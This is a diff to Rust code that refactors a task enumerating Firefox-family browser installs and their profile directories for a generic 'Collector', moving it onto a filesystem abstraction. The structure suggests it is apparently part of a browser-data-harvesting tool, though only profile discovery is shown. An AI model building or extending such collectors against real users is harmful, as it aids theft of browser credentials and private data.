@@ -8,20 +8,22 @@ use alloc::sync::Arc;
 use alloc::vec::Vec;
 use collector::Collector;
 use core::ops::Deref;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use tasks::{composite_task, CompositeTask, Task};
-use utils::path::Path;
 
-pub struct GeckoTask<'a, C: Collector> {
-    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C>)>
+pub struct GeckoTask<'a, C: Collector, F: FileSystem> {
+    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask<C, F>)>
 }
 
-impl<C: Collector> GeckoTask<'_, C> {
+impl<C: Collector, F: FileSystem> GeckoTask<'_, C, F> {
     pub(crate) fn new() -> Self {
         let all_browsers = get_gecko_browsers();
         let mut tasks = Vec::new();
         
         for base_browser in all_browsers {
-            let Some(browser) = get_browser_data(base_browser) else {
+            let Some(browser) = get_browser_data(&StorageFileSystem, base_browser) else {
                 continue
             };
             
@@ -40,22 +42,21 @@ impl<C: Collector> GeckoTask<'_, C> {
     }
 }
 
-impl<C: Collector> Task<C> for GeckoTask<'_, C> {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+impl<C: Collector, F: FileSystem> Task<C, F> for GeckoTask<'_, C, F> {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         for (browser, task) in &self.tasks {
             let parent = parent / browser.name;
-            unsafe { task.run(&parent, collector) }
+            task.run(&parent, filesystem, collector);
         }
     }
 }
 
-fn get_browser_data(browser: GeckoBrowser) -> Option<GeckoBrowserData> {
-    if !browser.base.is_exists() {
+fn get_browser_data<'a, F: FileSystem>(fs: &F, browser: GeckoBrowser<'a>) -> Option<GeckoBrowserData<'a>> {
+    if !fs.is_exists(&browser.base) {
         return None;
     }
     
-    let profiles = (&browser.base / "Profiles")
-        .list_files_filtered(&|f| f.is_dir())?;
+    let profiles = fs.list_files_filtered(&browser.base / "Profiles", &|f| fs.is_dir(f))?;
     
     if profiles.is_empty() {
         None
